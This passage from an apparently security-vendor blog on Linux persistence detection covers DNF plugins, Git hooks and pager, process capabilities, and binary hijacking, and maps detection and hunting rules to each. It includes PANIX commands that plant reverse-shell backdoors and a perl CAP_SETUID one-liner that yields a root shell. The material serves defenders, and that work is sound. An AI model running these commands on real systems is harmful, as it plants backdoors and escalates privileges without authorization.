| File     | [Yum Package Manager Plugin File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_yum_package_manager_plugin_file_creation.toml)              |
|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)           |
| Process  | [Yum/DNF Plugin Status Discovery](https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_yum_dnf_plugin_detection.toml)                       |
| Network  | [Egress Connection by a YUM Package Manager Descendant](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_connection_by_a_yum_package_manager_descendant.toml) |

### T1546.016 - installer packages (DNF)

[DNF](https://man7.org/linux/man-pages/man8/dnf.8.html) (Dandified YUM) is the next-generation package manager used in modern Red Hat-based Linux distributions, including Fedora and CentOS. It replaces YUM while maintaining compatibility with YUM repositories and packages. Similar to YUM, DNF utilizes a [plugin system](https://docs.redhat.com/it/documentation/red_hat_enterprise_linux/9/html/managing_software_with_the_dnf_tool/assembly_configuring-yum_managing-software-with-the-dnf-tool#proc_enabling-and-disabling-yum-plug-ins_assembly_configuring-yum) to extend its functionality, enabling users to integrate custom scripts or programs that execute at key points in the package management lifecycle.

DNF plugins enhance its capabilities by allowing customization and automation beyond standard package management tasks. These plugins are stored in specific directories:

* `/etc/dnf/pluginconf.d/` (for configuration files)
* `/usr/lib/python3.9/site-packages/dnf-plugins/` (for plugin scripts)

Of course the location for the dnf-plugins are bound to the Python version that is running on your system. Similarly to YUM, to enable a plugin, `plugins=1` must be set in `/etc/dnf/dnf.conf`. An example of a DNF plugin can look like this:

```
import dbus
import dnf
from dnfpluginscore import _

class NotifyPackagekit(dnf.Plugin):
	name = "notify-packagekit"

	def __init__(self, base, cli):
		super(NotifyPackagekit, self).__init__(base, cli)
		self.base = base
		self.cli = cli
	def transaction(self):
		try:
			bus = dbus.SystemBus()
			proxy = bus.get_object('org.freedesktop.PackageKit', '/org/freedesktop/PackageKit')
			iface = dbus.Interface(proxy, dbus_interface='org.freedesktop.PackageKit')
			iface.StateHasChanged('posttrans')
		except:
			pass 
```


As for YUM, each plugin must be enabled through a `.conf` configuration file:

```
[main]                                                                                                                               enabled=1
```

Similar to YUM's plugins and APT's configuration files, DNF plugins can be exploited by malicious actors to inject and execute unauthorized code during routine package management tasks. This attack vector extends to automated processes such as system updates, enabling persistent execution on systems with DNF-enabled repositories.

#### Persistence through T1546.016 - installer packages (DNF)

Similar to APT and YUM, DNF plugins should be crafted carefully to not interfere with the DNF update execution flow. You can use the following [example](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2049-L2069) or set it up by running:

```
> sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2013 --dnf
> [+] DNF persistence established
```

Running a command similar to `sudo dnf update` will trigger the backdoor. Take a look at the events:

![Events generated as a result of package manager (DNF) persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image12.png "Events generated as a result of package manager (DNF) persistence establishment")

After the execution of PANIX, `/usr/lib/python3.9/site-packages/dnfcon`, `/etc/dnf/plugins/dnfcon.conf` and `/usr/lib/python3.9/site-packages/dnf-plugins/dnfcon.py` are created, and the backdoor is established. These locations are dynamic, based on the Python version in use. After triggering it through the `sudo dnf update` command, the `dnf` → `sh` → `setsid` → `dnfcon` → `python` reverse shell chain is initiated. Similar to before, our DNF coverage is multi-layered, and detects the following events:

| Category | Coverage                                              |
|----------|-------------------------------------------------------|
| File | [DNF Package Manager Plugin File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_dnf_package_manager_plugin_file_creation.toml)|
|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)           |
| Process  | [Yum/DNF Plugin Status Discovery](https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_yum_dnf_plugin_detection.toml)                       |
| Network  | [Egress Connection by a DNF Package Manager Descendant](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_connection_by_a_dnf_package_manager_descendant.toml) |

### Hunting for persistence through T1546.016 - installer packages

Hunting for Package Manager persistence can be conducted through ES|QL and OSQuery. Indicators of compromise may include configuration and plugin file creations/modifications and unusual executions of APT/YUM/DNF parents. The [Persistence via Package Manager](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_package_manager.toml) rule contains several ES|QL/OSQuery queries that you can use to detect these abnormalities.

## T1546 - event triggered execution: Git 

[Git](https://manpages.debian.org/stretch/git-man/git.1.en.html) is a distributed version control system widely used for managing source code and coordinating collaborative software development. It tracks changes to files and enables efficient team collaboration across different locations. This makes Git a system that is present in a lot of organizations across both workstations and servers. Two functionalities that can be (ab)used for arbitrary code execution are [Git hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) and [Git pager](https://www.mslinn.com/git/200-git-pager.html). MITRE has no specific technique attributed to these persistence mechanisms, but they would best fit [T1546](https://attack.mitre.org/techniques/T1546/).

### T1546 - event triggered execution: Git hooks

[Git hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are scripts that Git executes before or after specific events such as commits, merges, and pushes. These hooks are stored in the `.git/hooks/` directory within each Git repository. They provide a mechanism for customizing and automating actions during the Git workflow. Common Git hooks include `pre-commit`, `post-commit`, `pre-merge`, and `post-merge`.

An example of a Git hook would be the file `.git/hooks/pre-commit`, with the following contents:

```
#!/bin/sh
# Check if this is the initial commit
if git rev-parse --verify HEAD >/dev/null 2>&1
then
    echo "pre-commit: About to create a new commit..."
    against=HEAD
else
    echo "pre-commit: About to create the first commit..."
    against=4b825dc642cb6eb9a060e54bf8d69288fbee4904
fi
```

As these scripts are executed on specific actions, and the contents of the scripts can be changed in whatever way the user wants, this method can be abused for persistence. Additionally, this method does not require root privileges, making it a convenient persistence technique for instances where root privileges are not yet obtained. These scripts can also be added to Github repositories prior to cloning, turning them into initial access vectors as well. 

### T1546 - event triggered execution: git pager

A [pager](https://en.wikipedia.org/wiki/Terminal_pager) is a program used to view content one screen at a time. It allows users to scroll through text files or command output without the text scrolling off the screen. Common pagers include [less](https://www.commandlinux.com/man-page/man1/pager.1.html), [more](https://man7.org/linux/man-pages/man1/more.1.html), and [pg](https://man7.org/linux/man-pages/man1/pg.1.html). A [Git pager](https://www.mslinn.com/git/200-git-pager.html) is a specific use of a pager program to display the output of Git commands. Git allows users to configure a pager to control the display of commands such as `git log`.

Git determines which pager to use through the following order of configuration:

* `/etc/gitconfig` (system-wide)
* `~/.gitconfig` or `~/.config/git/config` (user-specific)
* `.git/config` (repository specific)

A typical configuration where a pager is specified might look like this:

```
[core]
    pager = less
```

In this example, Git is configured to use less as the pager. When a user runs a command like `git log`, Git will pipe the output through less for easier viewing. The flexibility in specifying a pager can be exploited. For example, an attacker can set the pager to a command that executes arbitrary code. This can be done by modifying the `core.pager` configuration to include malicious commands. Let’s take a look at the two techniques discussed in this section. 

### Persistence through T1546 - Git

To test these techniques, the system requires a cloned Git repository. There is no point in setting up a custom repository, as the persistence mechanism depends on user actions, making a hidden and unused Git repository an illogical construct. You could initialize your own hidden repository and chain it together with a `cron`/`systemd`/`udev` persistence mechanism to initialize the repository on set intervals, but that is out of scope for now.

To test the Git Hook technique, ensure a Git repository is available on the system, and run:

```
> ./panix.sh --git --default --ip 192.168.1.1 --port 2014 --hook
```

`> [+] Created malicious pre-commit hook in /home/ruben/panix`

The program loops through the entire filesystem (as far as this is possible, based on permissions), finds all of the repositories, and backdoors them. To trigger the backdoor, run `git add -A` and `git commit -m "backdoored!"`. This will generate the following events:

![Events generated as a result of the Git Hook persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image3.png "Events generated as a result of the Git Hook persistence establishment")

In this figure we see PANIX looking for Git repositories, adding a `pre-commit` hook and granting it execution permissions, successfully planting the backdoor. Next, the backdoor is initiated through the `git commit`, and the `git` → `pre-commit` → `nohup` → `setsid` → `bash` reverse shell connection is initiated.

To test the Git pager technique, ensure a Git repository is available on the system and run: 

```
> ./panix.sh --git --default --ip 192.168.1.1 --port 2015 --pager
> [+] Updated existing Git config with malicious pager in /home/ruben/panix
> [+] Updated existing global Git config with malicious pager 
```

To trigger the payload, move into the backdoored repository and run a command such as `git log`. This will trigger the following events:

![Events generated as a result of the Git Pager persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image15.png "Events generated as a result of the Git Pager persistence establishment")

PANIX executes and starts searching for Git repositories. Once found, the configuration files are updated or created, and the backdoor is planted. Invoking the Git Pager (`less`) executes the backdoor, setting up the `git` → `sh` → `nohup` → `setsid` → `bash` reverse connection chain. 

We have several layers of detection, covering the Git Hook/Pager persistence techniques.

| Category | Coverage                                            |
|----------|-----------------------------------------------------|
| File     | [Git Hook Created or Modified](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_file_creation.toml)                        |
| Process  | [Git Hook Child Process](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_process_execution.toml)                              |
|          | [Git Hook Command Execution](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_execution.toml)                          |
|          | [Linux Restricted Shell Breakout via Linux Binary(s)](https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_evasion_linux_binary.toml) |
| Network  | [Git Hook Egress Network Connection](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_netcon.toml)                  |

### Hunting for persistence through T1546 - Git

Hunting for Git Hook/Pager persistence can be conducted through ES|QL and OSQuery. Potential indicators include file creations in the `.git/hook/` directories, Git Hook executions, and the modification/creation of Git configuration files. The [Git Hook/Pager Persistence](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_git_hook_pager.toml) hunting rule has several ES|QL and OSQuery queries that will aid in detecting this technique.

## T1548 - abuse elevation control mechanism: process capabilities

[Process capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) are a fine-grained access control mechanism that allows the division of the root user's privileges into distinct units. These capabilities can be independently enabled or disabled for processes, and are used to enhance security by limiting the privileges of processes. Instead of granting a process full root privileges, only the necessary capabilities are assigned, reducing the risk of exploitation. This approach follows the principle of least privilege.

To better understand them, some use cases for process capabilities are e.g. assigning `CAP_NET_BIND_SERVICE` to a web server that needs to bind to port 80, assigning `CAP_NET_RAW` to tools that need access to network interfaces or assigning `CAP_DAC_OVERRIDE` to backup software requiring access to all files. By leveraging these capabilities, processes are capable of performing tasks that are usually only possible with root access.

While process capabilities were developed to enhance security, once root privileges are acquired, attackers can abuse them to maintain persistence on a compromised system. By setting specific capabilities on binaries or scripts, attackers can ensure their malicious processes can operate with elevated privileges and allow for an easy way back to root access in case of losing it. Additionally, misconfigurations may allow attackers to escalate privileges. 

Some process capabilities can be (ab)used to establish persistence, escalate privileges, access sensitive data, or conduct other tasks. Process capabilities that can do this include, but are not limited to:

* `CAP_SYS_MODULE` (allows loading/unloading of kernel modules)
* `CAP_SYS_PTRACE` (enables tracing and manipulation of other processes)
* `CAP_DAC_OVERRIDE` (bypasses read/write/execute checks)
* `CAP_DAC_READ_SEARCH` (grants read access to any file on the system)
* `CAP_SETUID`/`CAP_SETGID` (manipulate UID/GID)
* `CAP_SYS_ADMIN` (to be honest, this just means root access)

A simple way of establishing persistence is to grant the process `CAP_SETUID` or `CAP_SETGID` capabilities (this is similar to setting the `SUID`/`SGID` bit to a process, which we discussed in [the previous persistence blog](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)). But all of the ones above can be used, be a bit creative here! MITRE does not have a technique dedicated to process capabilities. Similar to Setuid/Setgid, this technique can be leveraged for both privilege escalation and persistence. The most logical technique to add this mechanism to (based on the existing structure of the MITRE ATT&CK framework) would be [T1548](https://attack.mitre.org/techniques/T1548/). 

### Persistence through T1548 - process capabilities

Let’s leverage PANIX to set up a process with `CAP_SETUID` process capabilities by running:

```
> sudo ./panix.sh --cap --default
[+] Capability setuid granted to /usr/bin/perl
[-] ruby, is not present on the system.
[-] php is not present on the system.
[-] python is not present on the system.
[-] python3, is not present on the system.
[-] node is not present on the system. 
```

PANIX will by-default check for a list of processes that are easily exploitable after granting `CAP_SETUID` capabilities. You can use `--custom` and specify `--capability` and `--binary` to test some of your own. 

If your system has `Perl`, you can take a look at [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) to find how to escalate privileges with this capability set. 

```
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
```

Looking at the logs in Discover, we can see the following happening:

![Events generated as a result of the Linux capability persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image13.png "Events generated as a result of the Linux capability persistence establishment")

We can see PANIX being executed with `uid=0` (root), which grants `cap_setuid+ep` (effective and permitted) to `/usr/bin/perl`. Effective indicates that the capability is currently active for the process, while permitted indicates that the capability is allowed to be used by the process. Note that all events with `uid=0` have all effective/permitted capabilities set. After granting this capability and dropping down to user permissions, `perl` is executed and manipulates its own process UID to obtain root access. Feel free to try out different binaries/permissions.

As we have quite an extensive list of rules related to process capabilities (for discovery, persistence and privilege escalation activity), we will not list all of them here. Instead, you can take a look at [this blog post](https://www.elastic.co/security-labs/unlocking-power-safely-privilege-escalation-via-linux-process-capabilities), digging deeper into this topic.

### Hunting for persistence through T1548 - process capabilities

Hunting for process capability persistence can be done through ES|QL. We can either do a general hunt and find non uid 0 binaries with capabilities set, or hunt for specific potentially dangerous capabilities. To do so, we created the [Process Capability Hunting](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_process_capabilities.toml) rule.

## T1554 - compromise host software binary: hijacking system binaries

After gaining access to a system and, if necessary, escalating privileges to root access, system binary hijacking/wrapping is another option to establish persistence. This method relies on the trust and frequent execution of system binaries by a user. 

System binaries, located in directories like `/bin`, `/sbin`, `/usr/bin`, and `/usr/sbin` are commonly used by users/administrators to perform basic tasks. Attackers can hijack these system binaries by replacing or backdooring them with malicious counterparts. System binaries that are used often such as `cat`, `ls`, `cp`, `mv`, `less` or `sudo` are perfect candidates, as this mechanism relies on the user executing the binary. 

There are multiple ways to establish persistence through this method. The attacker may manipulate the system’s `$PATH` environment variable to prioritize a malicious binary over the regular system binary. Another method would be to replace the real system binary, executing arbitrary malicious code on launch, after which the regular command is executed.

Attackers can be creative in leveraging this technique, as any code can be executed. For example, the system-wide `sudo`/`su` binaries can be backdoored to capture a password every time a user attempts to run a command with `sudo`. Another method can be to establish a reverse connection every time a binary is executed or a backdoor binary is called on each binary execution. As long as the attacker hides well and no errors are presented to the user, this technique is difficult to detect. MITRE does not have a direct reference to this technique, but it probably fits [T1554](https://attack.mitre.org/techniques/T1554/) best.

Let’s take a look at what hijacking system binaries might look like. 

### Persistence through T1554 - hijacking system binaries

The implementation of system binary hijacking in PANIX leverages the wrapping of a system binary to establish a reverse connection to a specified IP. You can reference this [example](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2391-L2401) or set it up by executing:

```
> sudo ./panix.sh --system-binary --default --ip 192.168.1.1 --port 2016
> [+] cat backdoored successfully.
> [+] ls backdoored successfully.
```

Now, execute `ls` or `cat` to establish persistence. Let’s analyze the logs. 

![Events generated as a result of the Linux system binary hijacking persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image11.png "Events generated as a result of the Linux system binary hijacking persistence establishment")

In the figure above we see PANIX executing, moving `/usr/bin/ls` to `/usr/bin/ls.original`. It then backdoors `/usr/bin/ls` to execute arbitrary code, after which it calls `/usr/bin/ls.original` in order to trick the user. Afterwards, we see `bash` setting up the reverse connection. The copying/renaming of system binaries and the hijacking of the `sudo` binary are captured in the following detection rules.

| Category | Coverage                      |
|----------|-------------------------------|
| File     | [System Binary Moved or Copied](https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_binary_copied_to_suspicious_directory.toml) |
|          | [Potential Sudo Hijacking](https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_sudo_hijacking.toml)      |

### Hunting for persistence through T1554 - hijacking system binaries

This activity should be very uncommon, and therefore the detection rules above can be leveraged for hunting. Another way of hunting for this activity could be assembling a list of uncommon binaries to spawn child processes. To aid in this process we created the [Unusual System Binary Parent (Potential System Binary Hijacking Attempt)](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_unusual_system_binary_parent.toml) hunting rule.

## Conclusion

In this part of our “Linux Detection Engineering” series, we explored more advanced Linux persistence techniques and detection strategies, including init systems, run control scripts, message of the day, udev (rules), package managers, Git, process capabilities, and system binary hijacking. If you missed the previous part on persistence, catch up [here](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms).

We did not only explain each technique but also demonstrated how to implement them using [PANIX](https://github.com/Aegrah/PANIX). This hands-on approach allowed you to assess detection capabilities in your own security setup. Our discussion included detection and endpoint rule coverage and referenced effective hunting strategies, from ES|QL aggregation queries to live OSQuery hunts.

We hope you've found this format informative. Stay tuned for more insights into Linux detection engineering. Happy hunting!
